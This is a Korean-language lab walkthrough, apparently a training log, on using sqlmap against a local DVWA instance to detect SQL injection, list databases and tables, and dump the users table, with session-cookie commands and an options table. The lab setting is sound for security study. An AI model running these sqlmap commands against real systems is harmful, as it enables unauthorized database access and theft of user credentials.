# Day 4 — sqlmap SQLi 자동화

> sqlmap으로 DVWA SQLi를 자동 탐지하고 DB를 덤프한다

---

## sqlmap이란?

Day 2에서 Repeater로 **수동으로** 페이로드를 하나씩 넣었다면,
sqlmap은 SQLi 탐지부터 DB 덤프까지 **완전 자동화**해주는 도구.

```
URL + 파라미터 지정
       ↓
sqlmap이 수십 가지 페이로드 자동 시도
       ↓
취약점 발견 → DB 정보 자동 추출
```

---

## 실습 준비

### sqlmap 경로
```
C:\Users\admin\AppData\Roaming\Python\Python310\Scripts\sqlmap.exe
```

편의를 위해 변수로 지정:
```powershell
$sqlmap = "C:\Users\admin\AppData\Roaming\Python\Python310\Scripts\sqlmap.exe"
```

### DVWA 쿠키 확인
sqlmap이 로그인된 상태로 스캔하려면 세션 쿠키가 필요.
- Burp에서 DVWA 요청 확인 → Cookie 헤더 복사
- 또는 브라우저 개발자도구(F12) → Application → Cookies

---

## 실습 1 — 기본 스캔

```powershell
$sqlmap = "C:\Users\admin\AppData\Roaming\Python\Python310\Scripts\sqlmap.exe"

& $sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" `
  --cookie="PHPSESSID=여기에쿠키값; security=low" `
  --batch
```

- `-u` : 대상 URL
- `--cookie` : 인증 쿠키
- `--batch` : 모든 질문에 자동으로 기본값 선택 (대화형 입력 없이 실행)

---

## 실습 2 — DB 목록 조회

```powershell
& $sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" `
  --cookie="PHPSESSID=여기에쿠키값; security=low" `
  --batch --dbs
```

---

## 실습 3 — 테이블 목록

```powershell
& $sqlmap -u "..." --cookie="..." --batch -D dvwa --tables
```

---

## 실습 4 — 데이터 덤프

```powershell
& $sqlmap -u "..." --cookie="..." --batch -D dvwa -T users --dump
```

---

## 주요 옵션

| 옵션 | 설명 |
|------|------|
| `--dbs` | DB 목록 조회 |
| `-D dvwa` | 사용할 DB 지정 |
| `--tables` | 테이블 목록 |
| `-T users` | 사용할 테이블 지정 |
| `--dump` | 데이터 덤프 |
| `--level=3` | 테스트 강도 (1~5) |
| `--risk=2` | 위험도 허용 범위 (1~3) |
| `--batch` | 자동 응답 |
| `--dbs` | 전체 DB 열거 |

---

## Day 4 체크리스트

- [ ] sqlmap 기본 스캔 실행 (취약점 탐지)
- [ ] --dbs 로 DB 목록 조회
- [ ] -D dvwa --tables 로 테이블 목록 조회
- [ ] -T users --dump 로 데이터 덤프
